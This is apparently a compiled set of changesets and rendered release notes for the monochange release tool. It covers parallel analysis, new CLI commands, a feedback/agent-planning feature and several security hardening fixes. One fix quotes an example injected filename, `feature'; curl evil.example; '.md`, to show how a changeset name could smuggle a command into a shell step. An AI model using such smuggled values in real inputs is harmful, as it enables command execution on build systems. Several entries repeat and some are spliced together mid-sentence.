changesets.summary: Batch analysis snapshots and analyze packages in parallel
changesets.details:
`monochange analyze` and `monochange change classify` now spend far fewer git processes per run:

- Snapshot labels are resolved once per target instead of once per package. A working-tree label stages the entire tree into a temporary index, so a 100-package workspace previously repeated that staging 100 times per side of the comparison.
- Index snapshots and discovery materialization read every file through a single `git cat-file --batch` run instead of one `git show` process per file, matching what committed-revision snapshots already did.
- Packages are analyzed in parallel across CPU cores. Each package's analysis may spawn an ecosystem subprocess (`node` for TypeScript, `cargo semver-checks` for Cargo), which is exactly the work worth spreading; result order stays deterministic.
- Release trajectory analysis (`--release-ref`/`--main-ref`/`--head-ref`) shares one analysis session across its three comparison ranges, so discovery runs once per git tree instead of once per range.

On workspaces with many packages, classification time drops roughly with core count plus the eliminated per-package git round trips; single-package workspaces are unchanged.

changesets.summary: Add `monochange completions` and `monochange doctor`
changesets.details:
Two new commands close the two most common first-hour gaps:

- `monochange completions <bash|zsh|fish|elvish|powershell>` prints a shell completion script. The script is generated from the commands the current repository's `monochange.toml` defines, so config-defined workflows complete alongside the built-ins. Install it with your shell's completion mechanism, for example `monochange completions zsh > "${fpath[1]}/_monochange"`.
- `monochange doctor` checks the local environment in one place: git availability, `monochange.toml` parsing, and the toolchain behind every ecosystem enabled in the workspace (`cargo`, `node`, `deno`, `dart`, `python3`, `go`, `swift`, `pod`, `gradle`). Each check reports the tool's version or how to install it, with `--format json` for tooling. Checks are local only — nothing contacts the network.

changesets.summary: Preview `check --fix`, print init next steps, and retire `monochange populate`
changesets.details:
Three usability fixes:

- `monochange check --fix --dry-run` previews the fixes `--fix` would apply without writing any file. The summary says `would fix N files`, and the check still fails when errors remain on disk, so a dry run never silently passes a workspace that fixing would repair. `--dry-run` now requires `--fix`.
- `monochange init` prints the next commands to run (validate, discover, create, preview) instead of only naming the file it wrote.
- The legacy `monochange populate` command is removed. It has been a documented no-op since the default workflow set became empty; scripts calling it now get an unknown-command error and should call the steps they need directly.
- TOML syntax errors in `monochange.toml` render with the same source snippet semantic errors get: file, line and column, the offending line with a caret, and the parser's reason, instead of a flat `failed to parse` message.

changesets.summary: Quote interpolated release paths in shell command steps
changesets.details:
`Command` steps that use `{{ changed_files }}` or `{{ changesets }}` now quote each path with POSIX single quotes before the command runs. A changeset or changed-file name is repository content a merged pull request controls, so a name like `feature'; curl evil.example; '.md` previously expanded into the command string verbatim; in a `shell = true` step that could execute as separate commands. Both the shell path (`sh -c`) and the default no-shell path (`shlex` splitting) decode the same quoting, so commands keep receiving the original paths — including paths containing spaces, which now survive no-shell steps as a single argument.

Scalar values such as `{{ version }}` are unchanged, and `when` conditions plus step inputs still see raw paths. Configs that read raw path data through the structured `release.*` namespaces opt into unquoted values explicitly.

changesets.summary: Mitigate CVE-2026-98432 on the production Droplet
changesets.details:
The DigitalOcean deployment now installs a persistent nftables prerouting rule that drops inbound IPv4 TCP packets carrying IP options. The vulnerable kernel path is only reachable from a connection request with IP options, and the prerouting hook covers both host services and Docker-published Caddy ports.

Ubuntu 24.04 has not released a fixed kernel yet. The rule stays until the Droplet runs a kernel that includes the upstream fix, then `mitigate-cve-2026-98432.sh --remove` removes the table, unit, and helper files. Caddy also runs with `GODEBUG=multipathtcp=0` so its Go listener does not negotiate MPTCP, which the demonstrated exploit requires; the underlying bug is not MPTCP-specific, so the kernel update remains the real fix.

changesets.summary: Reboot the production Droplet after security updates
changesets.details: The DigitalOcean hardening script now writes `/etc/apt/apt.conf.d/51unattended-upgrades-auto-reboot`, so the Droplet reboots at 07:30 UTC when an unattended Ubuntu security upgrade leaves `/var/run/reboot-required`. The new kernel is activated instead of waiting for a manual reboot; Compose restarts the app and Caddy because both use `restart: unless-stopped`. The operations guide documents the window, the short outage, and the Docker repository updates that still need a manual pass.

changesets.summary: Honor ecosystems discovery settings and accept forgejo for init
changesets.details:
`[ecosystems.<id>]` discovery settings now shape `monochange discover` and the release paths built on it:

- `enabled = false` skips that ecosystem entirely.
- `roots = ["crates", "packages"]` restricts discovery to packages whose manifests live under the listed directories.
- `exclude = ["tools/**"]` removes packages whose manifests match any glob. A glob that fails to compile warns once and matches nothing instead of silently dropping the filter.

Previously these fields were parsed but discovery scanned every supported ecosystem regardless. `monochange init --provider` also accepts `forgejo` alongside `github`, `gitlab`, and `gitea`.

changesets.summary: Authenticate embedded feedback and approve connected-agent plans
changesets.details:
Adds the project-scoped `/api/v1/feedback/{project}` API for backend-issued sessions, private draft conversations, suggestions, idempotent submissions, discussion, votes, worker pairing, leased jobs, and authenticated results. Register integrations in the feedback console, then exchange a backend credential at `POST /sessions` with the host-authenticated `user_id` and `surface` (`web` or `mobile`). Backend credentials are returned once; only digests persist. Rotating an integration expires its existing sessions.

Projects default to manual planning and can enable automatic planning for new eligible feature requests with a daily budget. Plans bind a material brief revision and pinned repository commit; only a maintainer can approve implementation. Connected workers receive scoped jobs and return changes for draft PRs. Existing direct GitHub build dispatch cannot bypass approval for projects using the new flow.

Set `OPENROUTER_API_KEY` and `MONOCHANGE_FEEDBACK_MODEL` to enable semantic suggestions and assistant replies. `MONOCHANGE_FEEDBACK_COMPLETIONS_URL` can select a deployment-owned compatible endpoint. Without a configured provider, or when it fails, keyword suggestions remain available and drafts are preserved. Existing project feedback documents load with empty integration and planning state; intake, quotas, idempotency, and jobs share the existing transactional save.

Fallback bug triage records suggested verification steps as unverified. Providing screen context alone no longer marks a bug as reproduced.

For hosts that only accept HTML, embed `/embed/feedback.html?organization=acme&project=web` with `allow-scripts allow-same-origin allow-popups allow-popups-to-escape-sandbox`. The hosted popup exchanges first-party monochange sign-in at `POST /api/feedback/iframe-session`, validates its Origin against `MONOCHANGE_GITHUB_CALLBACK_URL`, and issues a ten-minute feedback-only token. It shares the public portal identity and quotas, keeps tokens out of the parent and URLs, and requires no host secret. Deploy the generated frame HTML, CSS, and JavaScript alongside the API. Configure the host CSP `frame-src` for the deployment; preserve popup opener access and permit framing on the feedback page.

changesets.summary: Collect feedback inside your apps and review agent plans
changesets.details:
Project maintainers can connect websites, React Native apps, and Flutter apps to their feedback console. Customers can describe a bug or idea, discover similar requests to upvote, discuss details, and follow progress using their existing app account.

Connect an agent on your own machine or server to prepare implementation plans. Choose requests yourself or enable automatic planning for new feature requests. Review each complete plan, request changes, reject it, or approve it for implementation. Approval opens the path to a draft pull request; it never merges the change automatically.

Website builders and CMS pages can also paste a hosted iframe without installing an SDK or creating a backend. Visitors choose **Sign in through monochange** to share feedback using their monochange account. The form fills the embedded panel and opens sign-in separately, so browsers do not need third-party cookies. An **Open feedback portal** link remains available when popups are blocked.

changesets.summary: Run a connected feedback agent locally or on your own server
changesets.details:
The first release adds `monochange-feedback-worker pair CONFIG.json` and `monochange-feedback-worker run CONFIG.json`. Pair through the project's feedback console using a single-use code, map permitted repositories to local checkouts, and configure the model endpoint and a preinstalled Docker or Podman check image.

```sh
monochange-feedback-worker pair .monochange/local/worker.json
monochange-feedback-worker run .monochange/local/worker.json
```

Planning reads a pinned export of the selected repository. After maintainer approval, implementation may change only the approved files, runs operator-configured checks in a container with no network or host credentials, and returns text changes for a draft pull request. Model credentials stay in the worker's process environment. Results are saved locally before submission so reconnecting can reconcile an interrupted response without repeating the agent run.

The worker has no merge or publishing operation. Keep its configuration and pending result file under `.monochange/local/` and revoke its credential in the console when disconnecting the machine.

changesets.summary: Add native feedback conversations to Flutter apps
changesets.details:
The first release provides a Dart `FeedbackClient` and a native Flutter `FeedbackSheet`. It supports similar-request suggestions, explicit upvotes, conversations, submission, discussion, and delivery status using the same API as the web and React Native SDKs.

```dart
FeedbackSheet(client: feedbackClient, identityKey: user.id)
```

Provide `getClientToken` through your authenticated backend and change `identityKey` when the user changes. The client refreshes expired sessions, preserves submission keys across interrupted responses, and prevents pending replies from reaching a new account. The example includes Android and iOS hosts.

The installation guide now distinguishes a paste-only iframe using monochange sign-in from SDK and script integrations using a host-authenticated backend. It includes package installation commands, a complete backend token-handler example, a plain HTML script example, Flutter token conversion, and an end-to-end verification checklist.

changesets.summary: Add canonical `monochange format` command
changesets.details:
Adds `monochange format` to rewrite `monochange.toml` in the idiomatic layout: top-level sections in a fixed order, `[package.*]` and `[group.*]` tables sorted by id, group members sorted alphabetically, and `[cli.*]` workflows last. Comments stay attached to their tables and the document header stays at the top.

The command formats the result with taplo using the repository's tab-based, 100-column configuration, so it does not require a separate taplo installation. Use `monochange format --check` to fail CI when the file needs formatting without writing changes. The repository's `lint:monochange` task and CI lint job now run that check.

changesets.summary: Encrypt GitHub OAuth tokens at rest and scope the hosted API token
changesets.details:
Two changes to the monochange.dev database and hosted API:

- GitHub user access and refresh tokens are now sealed with AES-256-GCM before they are written to the SQLite database, under a new required `TOKEN_ENCRYPTION_KEY` secret (`auth` section for production, generated in development and CI). A database file disclosure no longer leaks live GitHub tokens. Rows written before this change stay readable in plaintext and are replaced with sealed values the next time the token refreshes; rotating the key invalidates stored tokens and users simply sign in again.
- The deployment-wide `MONOCHANGE_TOKEN` no longer authorizes every connected repository. It only acts on repositories listed in the new `MONOCHANGE_TOKEN_REPOSITORIES` environment variable (`owner/repo`, comma or whitespace separated, case-insensitive). Deployments that rely on the token must list the repositories it may act on, or use GitHub Actions OIDC tokens, which were already restricted per repository.

changesets.summary: Tighten hosted endpoint verification and startup secret checks
changesets.details:
The hosted release API now rejects three edge cases that previously slipped through verification:

- GitHub Actions OIDC tokens must be signed with RS256. The verifier pinned the algorithm to the token header before, so a token that named any other algorithm selected how its own signature was checked.
- The server refuses to start when the resolved `JWT_SECRET` is an empty string. An empty secret is a valid HMAC key, and a profile that resolves the secret to nothing would have signed session tokens anyone could forge.
- The unreachable "repository mismatch" check after the connected-repository lookup is gone. Repositories are resolved by exact full name, so the check could never fire.

The constant-time comparison used for `MONOCHANGE_TOKEN` checks is now shared with the webhook signature path instead of existing as two identical copies.

changesets.summary: Create hosted release trees with inline file contents
changesets.details:
When a workflow sends release file contents instead of a prebuilt tree, `POST /api/release-commits` now creates the tree in one GitHub request with the contents inline. Previously the app made one installation-token `POST /git/blobs` request per file. Releases touching more than about 80 files hit GitHub's secondary rate limit for content creation, and the request outlasted the CLI's timeout. That broke the fallback the CLI uses when its own token cannot build the tree.

Deletions are still sent as `"sha": null`. A release with more than 4 MiB of file contents is split into tree requests chained through `base_tree`. A request that lists no files still creates a tree on the base commit, as before.

fix(github): build hosted release trees inline to avoid secondary rate limits

changesets.summary: Protect hosted release branches and pull requests
changesets.details:
Enforce hosted release authorization before creating or moving any branch. Every hosted commit must name a `<prefix>/release` branch distinct from both the requested base and the repository default. Older clients may still create or fast-forward a valid release branch without naming a base; replacing an existing release branch requires a named base whose head still matches the prepared commit.

Hosted pull request updates now require a server-signed marker bound to the PR number, node ID, bot creator, repository IDs, head, and base. Requests cannot adopt an unrelated PR or enable auto-merge on it. Existing release PRs without a marker must be closed and recreated once; rotating the deployment JWT signing secret also requires recreating open release PRs. If GitHub creates a release PR but its marker update fails, close the newly created PR identified in the error before retrying.

review_request.title: fix(app): enforce release branch policy and PR provenance
fix(app): enforce release branch policy and PR provenance

changesets.summary: Build hosted release trees without tripping GitHub's secondary rate limit
changesets.details:
Large hosted releases no longer fail. `monochange run release --commit --create-pr` with `MONOCHANGE_RELEASE_BACKEND=hosted` used to upload one `POST /git/blobs` request per release file. A release touching a hundred crate changelogs plus manifests and lockfiles exceeded GitHub's secondary rate limit for content creation, which is about 80 content-creating requests per minute. The resulting `403` was then reported as a missing `contents: write` permission. The fallback that sends file contents to the monochange app then ran past the 30 second provider timeout with `hosted CommitRelease request failed: error sending request for url (…/api/release-commits)`.

`monochange_github::create_release_tree` now sends UTF-8 files inline in the `POST /git/trees` request, so GitHub creates their blobs server-side and the whole release usually needs one tree request. Only non-UTF-8 files are uploaded as separate base64 blobs. Deletions (`"sha": null`) and file modes (`100644`, `100755`, `120000`) are unchanged. A release with more than 4 MiB of inline text is split into tree requests chained through `base_tree`. The GitHub Actions verified-commit path for release pull requests now also inlines its files instead of creating one blob each.

A `429`, or a `403` whose message names a rate limit, is now retried after 20, 40, and 60 seconds. If GitHub still rate limits the write, the warning names the rate limit before the release falls back to sending contents to the app:

```text
sending release file contents to the monochange app because the release tree could not be built: GitHub kept rate limiting git object writes in owner/repo after 3 retries (status 403: You have exceeded a secondary rate limit …)
```

Only a `403` without a rate-limit message still asks you to grant the job `contents: write`. The hosted `POST /api/release-commits` request now has a 5 minute timeout of its own. Other provider calls keep the 30 second `PROVIDER_HTTP_TIMEOUT`.

review_request.title: fix(github): build hosted release trees inline to avoid secondary rate limits

changesets.summary: Preserve workflows in hosted release commits
changesets.details: Hosted release commits now compare the final `.github/workflows` subtree with the prepared base for both uploaded files and prebuilt trees. Requests fail if workflow contents change, a protected directory becomes a file, or a tree listing is incomplete. Uploaded file paths must be canonical repository-relative paths and cannot replace or delete `.github` or `.github/workflows`; uploads to other `.github` files remain supported.

fix(app): preserve workflows in hosted release commits

changesets.summary: Bound OAuth work and reject callback replays
changesets.details:
`/login` and `/auth/callback` now consume the anonymous address bucket before server rendering. Valid signed callback state is atomically consumed in SQLite before the provider exchange, so replaying the original cookie cannot trigger more exchanges, including after a process restart. Failed exchanges also consume their state; start a fresh sign-in attempt to retry.

The application runs migration `006_create_oauth_state_uses` on startup. Consumed states are retained until their signed expiry and pruned during subsequent callbacks. Provider token requests have a ten-second timeout, and each app process permits at most sixteen concurrent exchanges. Saturated requests can retry their existing state because capacity rejection happens before consumption. Existing rate-limit environment variables continue to control the address bucket.

review_request.title: fix(oauth): limit SSR sign-ins and reject callback replays
fix(oauth): limit SSR sign-ins and reject callback replays

changesets.summary: Bound OIDC signing key refreshes independently of token key IDs
changesets.details:
Authentication for `POST /api/release-commits` and `POST /api/release-requests` now rejects unknown signing key IDs from a fresh JWKS cache without contacting GitHub. The cache remains valid for ten minutes. Concurrent refreshes share one request, and a shared retry deadline of thirty seconds prevents failed or cancelled attempts from restarting once per key ID. Invalid tokens can no longer force one provider request per attempt.

A signing key first published by GitHub while the cache is fresh is not fetched or accepted until that ten-minute cache expires.

JWKS responses must have a successful HTTP status and fit within 64 KiB before parsing. Failed refreshes retain the previous key set but do not authorize tokens with expired keys. Deployments and workflow callers need no configuration changes.

changesets.details: Bind dashboard organization and project authorization to each installation's stable provider account ID. GitHub membership responses must identify that same account before granting repository access, and legacy installations resolve their identity before membership checks. Organization logins remain display metadata; duplicate stored logins cannot select a tenant through public project routes. No configuration or data migration is required.

changesets.summary: Probe registries concurrently while filtering pending publishes
changesets.details: Publish readiness and placeholder flows check every package against its registry before publishing, one HTTP round trip at a time. Those probes now run eight at a time, so a release with many packages spends the longest single registry round trip (plus a bounded tail) instead of the sum of every package's latency. Results keep the input order, external-mode packages stay unprobed, and errors surface exactly as before.

changesets.summary: Patch pulldown-cmark exponential parsing advisory
changesets.details:
Bump `pulldown-cmark` from 0.13.4 to 0.13.6 in `app/Cargo.lock`.

0.13.4 grows its event stream exponentially when `ENABLE_WIKILINKS` is set, so a crafted markdown document pins a CPU for the duration of the parse (RUSTSEC-2026-0414, RUSTSEC-2026-0433). Patch-level move inside the existing 0.13 requirement; no source changes.

fix(deps): patch pulldown-cmark exponential parsing advisory

changesets.summary: Verify the complete prepared release record
changesets.details:
Reject modified release records before `CommitRelease`, even when their target IDs and versions still match the prepared release. Tag settings, package publication targets, provider metadata, changelogs, and release values must match the prepared manifest. A valid preparation timestamp and JSON key ordering remain unchanged. Rejected records leave overlapping release records untouched. If the expected record cannot be serialized, validation reports the cause before writing.

Previously, `monochange step commit-release` could accept a record with matching targets but modified release instructions. It now reports a content mismatch. `PrepareRelease` preserves existing records. Recovery requires restoring the record from a trusted preparation, or explicitly configuring `update_release_json = true` on `CommitRelease` to restore the expected record.

Prepared-release caches retain the originating command so separately invoked `prepare-release`, `commit-release`, and `open-release-request` steps validate the same record. Branch selection and command output continue to describe the current invocation. Older caches still load for inspection; before committing or opening a release request, rerun the original `PrepareRelease` workflow from trusted workspace inputs to establish that identity. Changing the producer command also requires restoring the expected record from trusted preparation or explicitly enabling `update_release_json` repair. Preparation preserves existing record bytes; record command changes remain a content mismatch.

review_request.title: fix(release): validate complete prepared release records
fix(release): validate complete prepared release records

changesets.summary: Resolve release records with one git walk instead of several per commit
changesets.details:
Release-record discovery — the lookup behind `step release-record`, `publish-readiness`, `tag-release`, and retarget planning — walked first-parent history by running four to six git commands per commit: a commit inspection for the parent, a redundant `rev-parse`, a shallow-file lookup, a parent-existence probe, and then the diff itself.

The walk now resolves every commit and its first parent in one `git log --first-parent --format=%H %P` run. A commit whose first parent never appears in the walk sits at a cut boundary (the root, or a shallow clone), and only those fall back to a full tree listing — the same fallback the per-commit probes used to select, decided from the single walk instead of extra git calls. Each non-boundary commit now costs one `git diff-tree` instead of the previous four to six processes, so finding a record hundreds of commits back stops spawning thousands of git processes.

Release-commit staging also asks git about every path at once: one `git ls-files` call reports which paths are tracked, and one `git check-ignore` call reports which are ignored, replacing up to two git processes per release path.

review_request.title: perf(release): resolve release records with one git walk
perf(release): resolve release records with one git walk

changesets.summary: Clarify release-record validation in the CLI guide
changesets.details: The `CommitRelease` reference now keeps mismatch protection enabled in its formatting example. It explains which prepared fields are checked, how rejected records preserve neighboring release records, and when deliberate recovery with `update_release_json = true` is appropriate. Whitespace and JSON key ordering require no configuration change.

fix(release): validate complete prepared release records

changesets.details: Refreshing a sign-in result can no longer submit the same attempt to GitHub again. If GitHub sign-in fails, start again from the sign-in page. During heavy sign-in traffic, the site may ask you to wait briefly and try again.

_Owner:_ [@ifiokjr](https://github.com/ifiokjr) · _Review:_ [PR #860](https://github.com/monochange/monochange/pull/860)

  _Owner:_ [@ifiokjr](https://github.com/ifiokjr) · _Review:_ [PR #856](https://github.com/monochange/monochange/pull/856)

#### Integrate feedback with copyable installation examples

_Owner:_ [@ifiokjr](https://github.com/ifiokjr) · _Review:_ [PR #864](https://github.com/monochange/monochange/pull/864)

The installation guide now distinguishes a paste-only iframe using monochange sign-in from SDK and script integrations using a host-authenticated backend. It includes package installation commands, a complete backend token-handler example, a plain HTML script example, Flutter token conversion, and an end-to-end verification checklist.

Coding agents can follow `docs/agents/feedback-widget.md` from `AGENTS.md` to locate the implementation and run focused local checks. The guide distinguishes project slugs from numeric IDs and makes publication and deployment prerequisites explicit. Runtime behavior is unchanged; the patch note covers the rendered website documentation.

#### Add canonical `monochange format` command

_Owner:_ [@ifiokjr](https://github.com/ifiokjr) · _Review:_ [PR #854](https://github.com/monochange/monochange/pull/854)

Adds `monochange format` to rewrite `monochange.toml` in the idiomatic layout: top-level sections in a fixed order, `[package.*]` and `[group.*]` tables sorted by id, group members sorted alphabetically, and `[cli.*]` workflows last. Comments stay attached to their tables and the document header stays at the top.

The command formats the result with taplo using the repository's tab-based, 100-column configuration, so it does not require a separate taplo installation. Use `monochange format --check` to fail CI when the file needs formatting without writing changes. The repository's `lint:monochange` task and CI lint job now run that check.

#### Encrypt GitHub OAuth tokens at rest and scope the hosted API token

_Owner:_ [@ifiokjr](https://github.com/ifiokjr) · _Review:_ [PR #834](https://github.com/monochange/monochange/pull/834)

Two changes to the monochange.dev database and hosted API:

- GitHub user access and refresh tokens are now sealed with AES-256-GCM before they are written to the SQLite database, under a new required `TOKEN_ENCRYPTION_KEY` secret (`auth` section for production, generated in development and CI). A database file disclosure no longer leaks live GitHub tokens. Rows written before this change stay readable in plaintext and are replaced with sealed values the next time the token refreshes; rotating the key invalidates stored tokens and users simply sign in again.
- The deployment-wide `MONOCHANGE_TOKEN` no longer authorizes every connected repository. It only acts on repositories listed in the new `MONOCHANGE_TOKEN_REPOSITORIES` environment variable (`owner/repo`, comma or whitespace separated, case-insensitive). Deployments that rely on the token must list the repositories it may act on, or use GitHub Actions OIDC tokens, which were already restricted per repository.

#### Tighten hosted endpoint verification and startup secret checks

_Owner:_ [@ifiokjr](https://github.com/ifiokjr) · _Review:_ [PR #833](https://github.com/monochange/monochange/pull/833)

The hosted release API now rejects three edge cases that previously slipped through verification:

- GitHub Actions OIDC tokens must be signed with RS256. The verifier pinned the algorithm to the token header before, so a token that named any other algorithm selected how its own signature was checked.
- The server refuses to start when the resolved `JWT_SECRET` is an empty string. An empty secret is a valid HMAC key, and a profile that resolves the secret to nothing would have signed session tokens anyone could forge.
- The unreachable "repository mismatch" check after the connected-repository lookup is gone. Repositories are resolved by exact full name, so the check could never fire.

The constant-time comparison used for `MONOCHANGE_TOKEN` checks is now shared with the webhook signature path instead of existing as two identical copies.

#### Create hosted release trees with inline file contents

_Owner:_ [@ifiokjr](https://github.com/ifiokjr) · _Review:_ [PR #861](https://github.com/monochange/monochange/pull/861)

When a workflow sends release file contents instead of a prebuilt tree, `POST /api/release-commits` now creates the tree in one GitHub request with the contents inline. Previously the app made one installation-token `POST /git/blobs` request per file. Releases touching more than about 80 files hit GitHub's secondary rate limit for content creation, and the request outlasted the CLI's timeout. That broke the fallback the CLI uses when its own token cannot build the tree.

Deletions are still sent as `"sha": null`. A release with more than 4 MiB of file contents is split into tree requests chained through `base_tree`. A request that lists no files still creates a tree on the base commit, as before.

#### Protect hosted release branches and pull requests

_Owner:_ [@ifiokjr](https://github.com/ifiokjr) · _Review:_ [PR #852](https://github.com/monochange/monochange/pull/852)

Enforce hosted release authorization before creating or moving any branch. Every hosted commit must name a `<prefix>/release` branch distinct from both the requested base and the repository default. Older clients may still create or fast-forward a valid release branch without naming a base; replacing an existing release branch requires a named base whose head still matches the prepared commit.

Hosted pull request updates now require a server-signed marker bound to the PR number, node ID, bot creator, repository IDs, head, and base. Requests cannot adopt an unrelated PR or enable auto-merge on it. Existing release PRs without a marker must be closed and recreated once; rotating the deployment JWT signing secret also requires recreating open release PRs. If GitHub creates a release PR but its marker update fails, close the newly created PR identified in the error before retrying.

- **Preserve workflows in hosted release commits.** Hosted release commits now compare the final `.github/workflows` subtree with the prepared base for both uploaded files and prebuilt trees. Requests fail if workflow contents change, a protected directory becomes a file, or a tree listing is incomplete. Uploaded file paths must be canonical repository-relative paths and cannot replace or delete `.github` or `.github/workflows`; uploads to other `.github` files remain supported.
  _Owner:_ [@ifiokjr](https://github.com/ifiokjr) · _Review:_ [PR #849](https://github.com/monochange/monochange/pull/849)

#### Bound OAuth work and reject callback replays

_Owner:_ [@ifiokjr](https://github.com/ifiokjr) · _Review:_ [PR #847](https://github.com/monochange/monochange/pull/847)

`/login` and `/auth/callback` now consume the anonymous address bucket before server rendering. Valid signed callback state is atomically consumed in SQLite before the provider exchange, so replaying the original cookie cannot trigger more exchanges, including after a process restart. Failed exchanges also consume their state; start a fresh sign-in attempt to retry.

The application runs migration `006_create_oauth_state_uses` on startup. Consumed states are retained until their signed expiry and pruned during subsequent callbacks. Provider token requests have a ten-second timeout, and each app process permits at most sixteen concurrent exchanges. Saturated requests can retry their existing state because capacity rejection happens before consumption. Existing rate-limit environment variables continue to control the address bucket.

#### Bound OIDC signing key refreshes independently of token key IDs

_Owner:_ [@ifiokjr](https://github.com/ifiokjr) · _Review:_ [PR #848](https://github.com/monochange/monochange/pull/848)

Authentication for `POST /api/release-commits` and `POST /api/release-requests` now rejects unknown signing key IDs from a fresh JWKS cache without contacting GitHub. The cache remains valid for ten minutes. Concurrent refreshes share one request, and a shared retry deadline of thirty seconds prevents failed or cancelled attempts from restarting once per key ID. Invalid tokens can no longer force one provider request per attempt.

A signing key first published by GitHub while the cache is fresh is not fetched or accepted until that ten-minute cache expires.

JWKS responses must have a successful HTTP status and fit within 64 KiB before parsing. Failed refreshes retain the previous key set but do not authorize tokens with expired keys. Deployments and workflow callers need no configuration changes.

#### Authorize organization access through stable provider identities

_Owner:_ [@ifiokjr](https://github.com/ifiokjr) · _Review:_ [PR #846](https://github.com/monochange/monochange/pull/846)

Bind dashboard organization and project authorization to each installation's stable provider account ID. GitHub membership responses must identify that same account before granting repository access, and legacy installations resolve their identity before membership checks. Organization logins remain display metadata; duplicate stored logins cannot select a tenant through public project routes. No configuration or data migration is required.

#### Patch pulldown-cmark exponential parsing advisory

_Owner:_ [@ifiokjr](https://github.com/ifiokjr) · _Review:_ [PR #865](https://github.com/monochange/monochange/pull/865)

Bump `pulldown-cmark` from 0.13.4 to 0.13.6 in `app/Cargo.lock`.

0.13.4 grows its event stream exponentially when `ENABLE_WIKILINKS` is set, so a crafted markdown document pins a CPU for the duration of the parse (RUSTSEC-2026-0414, RUSTSEC-2026-0433). Patch-level move inside the existing 0.13 requirement; no source changes.

- **Clarify release-record validation in the CLI guide.** The `CommitRelease` reference now keeps mismatch protection enabled in its formatting example. It explains which prepared fields are checked, how rejected records preserve neighboring release records, and when deliberate recovery with `update_release_json = true` is appropriate. Whitespace and JSON key ordering require no configuration change.
  _Owner:_ [@ifiokjr](https://github.com/ifiokjr) · _Review:_ [PR #850](https://github.com/monochange/monochange/pull/850)

entries:
#### Mitigate CVE-2026-98432 on the production Droplet

_Owner:_ [@ifiokjr](https://github.com/ifiokjr) · _Review:_ [PR #859](https://github.com/monochange/monochange/pull/859)

The DigitalOcean deployment now installs a persistent nftables prerouting rule that drops inbound IPv4 TCP packets carrying IP options. The vulnerable kernel path is only reachable from a connection request with IP options, and the prerouting hook covers both host services and Docker-published Caddy ports.

Ubuntu 24.04 has not released a fixed kernel yet. The rule stays until the Droplet runs a kernel that includes the upstream fix, then `mitigate-cve-2026-98432.sh --remove` removes the table, unit, and helper files. Caddy also runs with `GODEBUG=multipathtcp=0` so its Go listener does not negotiate MPTCP, which the demonstrated exploit requires; the underlying bug is not MPTCP-specific, so the kernel update remains the real fix.

#### Collect feedback inside your apps and review agent plans

_Owner:_ [@ifiokjr](https://github.com/ifiokjr) · _Review:_ [PR #860](https://github.com/monochange/monochange/pull/860)

Project maintainers can connect websites, React Native apps, and Flutter apps to their feedback console. Customers can describe a bug or idea, discover similar requests to upvote, discuss details, and follow progress using their existing app account.

Connect an agent on your own machine or server to prepare implementation plans. Choose requests yourself or enable automatic planning for new feature requests. Review each complete plan, request changes, reject it, or approve it for implementation. Approval opens the path to a draft pull request; it never merges the change automatically.

Website builders and CMS pages can also paste a hosted iframe without installing an SDK or creating a backend. Visitors choose **Sign in through monochange** to share feedback using their monochange account. The form fills the embedded panel and opens sign-in separately, so browsers do not need third-party cookies. An **Open feedback portal** link remains available when popups are blocked.

#### Add `monochange completions` and `monochange doctor`

_Packages:_ 🟠 _@monochange/skill_, 🟠 _monochange_

_Owner:_ [@ifiokjr](https://github.com/ifiokjr) · _Review:_ [PR #840](https://github.com/monochange/monochange/pull/840)

Two new commands close the two most common first-hour gaps:

- `monochange completions <bash|zsh|fish|elvish|powershell>` prints a shell completion script. The script is generated from the commands the current repository's `monochange.toml` defines, so config-defined workflows complete alongside the built-ins. Install it with your shell's completion mechanism, for example `monochange completions zsh > "${fpath[1]}/_monochange"`.
- `monochange doctor` checks the local environment in one place: git availability, `monochange.toml` parsing, and the toolchain behind every ecosystem enabled in the workspace (`cargo`, `node`, `deno`, `dart`, `python3`, `go`, `swift`, `pod`, `gradle`). #### Batch analysis snapshots and analyze packages in parallel

_Packages:_ ⚪ _monochange_, 🟢 _monochange_analysis_

_Owner:_ [@ifiokjr](https://github.com/ifiokjr) · _Review:_ [PR #836](https://github.com/monochange/monochange/pull/836)

`monochange analyze` and `monochange change classify` now spend far fewer git processes per run:

- Snapshot labels are resolved once per target instead of once per package. A working-tree label stages the entire tree into a temporary index, so a 100-package workspace previously repeated that staging 100 times per side of the comparison.
- Index snapshots and discovery materialization read every file through a single `git cat-file --batch` run instead of one `git show` process per file, matching what committed-revision snapshots already did.
- Packages are analyzed in parallel across CPU cores. Each package's analysis may spawn an ecosystem subprocess (`node` for TypeScript, `cargo semver-checks` for Cargo), which is exactly the work worth spreading; result order stays deterministic.
- Release trajectory analysis (`--release-ref`/`--main-ref`/`--head-ref`) shares one analysis session across its three comparison ranges, so discovery runs once per git tree instead of once per range.

On workspaces with many packages, classification time drops roughly with core count plus the eliminated per-package git round trips; single-package workspaces are unchanged.

#### Quote interpolated release paths in shell command steps

_Packages:_ 🟢 _monochange_

_Owner:_ [@ifiokjr](https://github.com/ifiokjr) · _Review:_ [PR #835](https://github.com/monochange/monochange/pull/835)

`Command` steps that use `{{ changed_files }}` or `{{ changesets }}` now quote each path with POSIX single quotes before the command runs. A changeset or changed-file name is repository content a merged pull request controls, so a name like `feature'; curl evil.example; '.md` previously expanded into the command string verbatim; in a `shell = true` step that could execute as separate commands. Both the shell path (`sh -c`) and the default no-shell path (`shlex` splitting) decode the same quoting, so commands keep receiving the original paths — including paths containing spaces, which now survive no-shell steps as a single argument.

Scalar values such as `{{ version }}` are unchanged, and `when` conditions plus step inputs still see raw paths. Configs that read raw path data through the structured `release.*` namespaces opt into unquoted values explicitly.

#### Build hosted release trees without tripping GitHub's secondary rate limit

_Packages:_ 🟢 _monochange_, 🟢 _monochange_github_

_Owner:_ [@ifiokjr](https://github.com/ifiokjr) · _Review:_ [PR #861](https://github.com/monochange/monochange/pull/861)

Large hosted releases no longer fail. `monochange run release --commit --create-pr` with `MONOCHANGE_RELEASE_BACKEND=hosted` used to upload one `POST /git/blobs` request per release file. A release touching a hundred crate changelogs plus manifests and lockfiles exceeded GitHub's secondary rate limit for content creation, which is about 80 content-creating requests per minute. The resulting `403` was then reported as a missing `contents: write` permission. The fallback that sends file contents to the monochange app then ran past the 30 second provider timeout with `hosted CommitRelease request failed: error sending request for url (…/api/release-commits)`.

`monochange_github::create_release_tree` now sends UTF-8 files inline in the `POST /git/trees` request, so GitHub creates their blobs server-side and the whole release usually needs one tree request. Only non-UTF-8 files are uploaded as separate base64 blobs. Deletions (`"sha": null`) and file modes (`100644`, `100755`, `120000`) are unchanged. A release with more than 4 MiB of inline text is split into tree requests chained through `base_tree`. ```text


